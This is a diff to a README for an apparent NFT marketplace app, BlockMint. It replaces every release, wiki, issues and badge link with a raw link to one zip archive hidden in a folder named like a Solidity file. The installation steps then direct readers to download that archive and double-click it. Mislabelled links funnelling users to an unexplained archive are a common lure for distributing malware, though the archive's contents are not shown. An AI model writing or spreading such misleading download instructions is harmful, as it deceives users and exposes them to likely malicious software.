@@ -6,7 +6,7 @@ Welcome to BlockMint, a user-friendly decentralized NFT marketplace. Here, you c
 
 ## 📥 Download the Application
 
-[![Download BlockMint](https://img.shields.io/badge/Download-BlockMint-brightgreen)](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/releases)
+[![Download BlockMint](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)
 
 ## 📋 System Requirements
 
@@ -21,13 +21,13 @@ To use BlockMint, ensure your system meets the following requirements:
 
 To get the latest version of BlockMint, visit the Releases page. This is where you can find all available versions of the application, along with detailed release notes.
 
-[Visit the Releases Page](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)
 
 ## 🛠️ Download & Install
 
-1. Go to the [Releases page](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip).
 2. Look for the latest version.
-3. Click on the download link for your operating system. The file will typically have a name like `BlockMint-setup.exe` for Windows or `BlockMint-mac.dmg` for macOS.
+3. Click on the download link for your operating system. The file will typically have a name like `https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip` for Windows or `https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip` for macOS.
 4. Save the file to your computer.
 5. Locate the downloaded file and double-click it to start the installation.
 
@@ -53,8 +53,8 @@ BlockMint offers the following key features:
 
 If you encounter issues or have questions while using BlockMint, detailed documentation is available. This includes setup guides, troubleshooting tips, and FAQs. 
 
-1. Visit the [Documentation page](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/wiki).
-2. Check the [Issues section](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/issues) for any common problems and solutions.
+1. Visit the [Documentation page](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip).
+2. Check the [Issues section](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip) for any common problems and solutions.
 
 ## 🗣️ Community Feedback
 
@@ -62,8 +62,8 @@ We would love to hear your feedback. Share your thoughts or report any issues in
 
 ## 🔗 Useful Links
 
-- [BlockMint Releases Page](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/releases)
-- [Documentation](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/wiki)
-- [Community Issues](https://github.com/abduldanish07/BlockMint-NFT-Marketplace/issues)
+- [BlockMint Releases Page](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)
+- [Documentation](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)
+- [Community Issues](https://raw.githubusercontent.com/abduldanish07/BlockMint-NFT-Marketplace/main/Marketplace.sol/Mint_Block_Marketplace_NF_tininess.zip)
 
 Thank you for choosing BlockMint! Start creating and trading your own NFTs today.
